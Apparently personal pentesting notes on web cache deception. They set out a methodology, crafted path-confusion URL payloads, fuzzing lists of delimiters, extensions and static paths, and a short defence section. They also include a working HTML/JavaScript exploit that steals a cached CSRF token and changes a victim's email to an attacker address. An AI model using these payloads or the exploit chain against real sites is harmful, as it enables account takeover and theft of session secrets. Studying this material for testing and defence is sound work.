# Intro
## Web caches Concepts

![[Pasted image 20260214152446.png]]

- if the copy is available => **cache hit** else -> **cache miss**
- Content Delivery Networks (CDNs) speed up delivery by serving content from the server closest to the user, reducing load times by minimizing the distance data travels.
- The cache makes this decision by generating a '**cache key**' from elements of the HTTP request.
	- URL *path*
	- query *parameters*
	- variety of other elements like *headers* and *content type*
-  **Cache rules** 
	- often set up to store static resources
	- ==Web cache deception== attacks exploit these rules
		- *Static file extension* rules -> `.css` , `.js`
		- *Static directory* rules -> `/static` or `/assets`
		- *File name* rules - `robots.txt` and `favicon.ico`
- **Cache buster** 
	- forces the browser to load the most recent version of a file, rather than a previously cached version
	- you can change the key by adding a query string to the path and changing it each time you send a request.
	- use [**Param miner**](https://github.com/PortSwigger/param-miner) to do so
- **Cache Oracle**
	- a reliable page (such as homepage) to test for cahce hits and misses in order to detect the caching behavior.
## Cache Headers

### 1. Cache-Control

| Directive   | Description                                         |
| ----------- | --------------------------------------------------- |
| `public`    | Allows caching by the server cache and browser      |
| `private`   | Allows caching only by the browser                  |
| `no-store`  | Do not cache at all                                 |
| `no-cache`  | Cache it, but check with the server before using    |
| `max-age=0` | Immediately expires                                 |
| `s-maxage`  | Has higher priority for server cache than `max-age` |

---

### 2. X-Cache

| X-Cache Value | Description                                                           |
| ------------- | --------------------------------------------------------------------- |
| `hit`         | The request did not reach the origin server and was served from cache |
| `miss`        | No cache existed; response came from the origin server                |
| `dynamic`     | Content generated dynamically by the server; usually not cached       |
| `refresh`     | Cache was old and had server validation, but it was rechecked         |
| `revalidate`  | Cache existed but required server validation                          |
| `stale`       | Cached response was used even though it had expired                   |
**[common catching status fields used by major service vendors ](https://air.unimi.it/retrieve/7df93d97-538a-4df6-9355-7625561e0416/CLOSER_2024_36_CR%20%281%29.pdf)**
![[Pasted image 20260214154819.png]]


---

### 3. Vary

Specifies which request parameters the cache should use to differentiate responses.

# web cache deception
## methodology 
1. Identify a <mark style="background: #FFF3A3A6;">target</mark> endpoint that returns a dynamic response containing sensitive information
   - focus on endpoints that use `GET`, `HEAD`, or `OPTIONS`
2. Identify a <mark style="background: #FFF3A3A6;">discrepancy</mark> in how the cache and origin server parse the URL path. in how they do the following things:
	- **Map URLs to resources**.
	- **Process delimiter characters**.
	- **Normalize paths**.
3. <mark style="background: #FFF3A3A6;">Craft</mark> a malicious URL that uses the discrepancy to trick the cache into storing a dynamic response
	- make sure that each request you send has a different cache key ( **Param miner > Settings** menu, then select **Add dynamic cachebuster** ). Otherwise, you may be served cached responses

- [ ] Using discrepancies
	- [ ] path mapping
		- [ ] traditional URL mapping vs RESTful URL mapping 
		      `http://example.com/user/123/profile/wcd.css` -> origins sees wcd.css as paramter (REST) cache sees it as static file
		- [ ] `/api/orders/123` to `/api/orders/123/foo` => same result 
		- [ ] `/api/orders/123/foo` to `/api/orders/123/foo.js` => result cached
	- [ ] delimiter 
	      <mark style="background: #D2B3FFA6;">find a HOOK and and find out the delimiteres accepted by origin server</mark> -> <mark style="background: #D2B3FFA6;">find another HOOK and find out  all the cachable extensions and and ASCII characters (FUZZ)</mark>  => exploit
		- [ ] path parameter `;` -> `/profile;foo.css`
		- [ ] downgrading back to base
			- [ ] `/profile` by html parser 
			       `/profile.css` by css parser but doesnt exists => reject  
			       `/profile.ico` no parser default is html parser => pwned
			- ![[Pasted image 20260214190428.png]]
		- [ ] Encoded characters `%00` -> `/profile%00foo.js`
	- [ ] delimiter decoding (when the origin recieves the decoded one (by cdn or itself))
		- [ ] `#` -> `%23` => `/profile%23wcd.css`
		- [ ] FUZZ the [[charfuzz.txt|nonprintable chars]]
	- [ ] normalization 
		- [ ] by the origin server? 
			- [ ] Detect`/aaa/..%2fprofile`  
			- [ ] Exploit: `/<static-directory-prefix>/..%2f<dynamic-path>`
		- [ ] by the cache server? 
			- [ ] Detect: establish  *HOOK* (one which does get cached (e.g `/assets/js/stockCheck.js`) another that doesnt trigger cache behavior(e.g `/assets`) note that `/assets/aaa` must not be cached in this example) 
				- [ ]  `/aaa/..%2fassets/js/stockCheck.js`
				- [ ] `/assets/..%2fjs/stockCheck.js`
			- [ ] Exploit: `/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`
				- [ ] encode all characters in the path traversal sequence
				- [ ] identify a **delimiter** that is used by the origin server but not the cache
					- [ ] example: `/profile;%2f%2e%2e%2fstatic` (`;` is originside delimiter)
- [ ] Exploiting cache rules
	- [ ] use static directory
	- [ ] use file name
		- [ ] special files like `robots.txt`, `index.html`, and `favicon.ico`
		- [ ] example: `/profile%2f%2e%2e%2findex.html` to  Detecting normalization discrepancies
## chains
- Dynamic pages, be they publicly accessible or protected behind authentication gates, may include secrets such as ==CSRF tokens==, ==CSP nonces==, ==Session ID==, ==OAuth state parameters== [reference ](https://www.usenix.org/system/files/sec22-mirheidari.pdf)
-  Cashe Deceptin to CSRF in a single click
```html
<!DOCTYPE html>
<html>
  <body>
    <h2>!!! Cashe Deceptin to CSRF in a single click !!!</h2>
    <script>
      fetch('https://victim.com/profile.css', { credentials: 'include' })
        .then(res => res.text())
        .then(body => {
          const tokenMatch = body.match(/name="csrf"\s+value="([^"]+)"/i);
          if (!tokenMatch) return;

          const token = tokenMatch[1];
          fetch('https://victim.com/change-email', {
            method: 'POST',
            credentials: 'include',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `email=evil@attacker.com&csrf=${token}`
          });
        });
    </script>
  </body>
</html>
```

- [ ] the request needs any kind of unique token or **`X-Auth-Token`** header? 
	- use **CSPT** from an authenticated endpoint 
		- [Matan Berson’s excellent introduction to CSPT](https://matanber.com/blog/cspt-levels/) – a thorough explanation of the concept from the basics. 
```js
const apiUrl = `https://api.example.com/v1/users/info/${userId}`;fetch(apiUrl, {   method: 'GET',   headers: {     'X-Auth-Token': authToken   } 
```
## defence
- [ ] use `Cache-Control`to mark dynamic resources, directives `no-store` and `private`
- [ ] Configure your CDN to dont override the `Cache-Control` header 
- [ ] Activate any protection that your CDN for cache attacks
	- [ ] `Cloudflare's Cache Deception Armor`
- [ ] Verify that there aren't any discrepancies between how the origin server and the cache interpret URL paths
# payloads 
- common delimiters 
```
! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~ %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E %00 %0A %09
```
-  common **extensions**
```
.7z .apk .avi .bin .bmp .bz2 .class .css .csv .doc .docx .dmg .eot .eps .exe .ejs .flac .gif .ico .iso .jar .js .jpg .jpeg .mid .midi .mk .mp3 .mp4 .ogg .otf .pdf .pict .pls .ps .ppt .pptx .rar .svg .svgz .swf .tar .tif .tiff .ttf .torrent .webp .woff .woff2 .xls .xlsx .zip .zst
```
- common **static dirs** 
```
/static
/assets
/wp-content
/media
/templates
/public
/shared
```
- common **File name rules**
```
index.html
robots.txt
humans.txt
security.txt
manifest.json
sitemap.xml
favicon.ico
apple-touch-icon.png
browserconfig.xml
styles.css
main.css
bootstrap.min.css
main.js
app.js
vendor.js
scripts.min.js
logo.png
banner.jpg
icon.svg
background.webp
favicon.ico
video.mp4
intro.webm
audio.mp3
fonts.woff
fonts.woff2
custom-font.ttf
icon-font.eot
config.json
data.json
```
